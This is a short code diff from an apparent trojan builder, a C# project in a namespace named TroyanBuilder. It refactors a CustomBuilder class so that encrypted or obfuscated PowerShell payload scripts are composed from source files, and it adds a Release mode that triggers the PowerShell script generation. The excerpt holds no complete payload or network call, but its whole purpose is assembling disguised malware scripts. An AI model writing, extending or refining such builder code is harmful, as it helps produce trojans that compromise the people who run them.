@@ -10,6 +10,10 @@ namespace TroyanBuilder;
 [SuppressMessage("ReSharper", "MemberCanBePrivate.Global")]
 public abstract partial class CustomBuilder
 {
+    protected CustomBuilder(TroyanBuildMode mode) => Mode = mode;
+
+    public TroyanBuildMode Mode { get; }
+
     protected abstract string SourceDir {get;}
 
     protected abstract string OutputFile { get; }
@@ -52,9 +56,10 @@ public abstract partial class CustomBuilder
         if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
             Directory.CreateDirectory(directoryPath);
 
-        Build();
+        ComposeScript();
 
-        GeneratePowerShellScript(OutputFile, OutputFile, true);
+        if (Mode == TroyanBuildMode.Release)
+            GeneratePowerShellScript(OutputFile, OutputFile, true);
 
         PostBuild();
 
@@ -118,12 +123,7 @@ _SERVER
     }
 
 
-    private void Build()
-    {
-        BuildRelease();
-    }
-
-    private void BuildRelease()
+    private void ComposeScript()
     {
         foreach (var x in SourceFiles.Where(a=> a.Name == EntryPoint))
         {
@@ -141,7 +141,7 @@ _SERVER
             var renamedKey = key;
 
 
-            psString.AppendLine($"    \"{renamedKey}\" = \"{kvp.CryptedData(renamed)}\"");
+            psString.AppendLine($"    \"{renamedKey}\" = \"{kvp.TaskTablePayload(renamed)}\"");
         }
 
         var doo = psString.ToString();
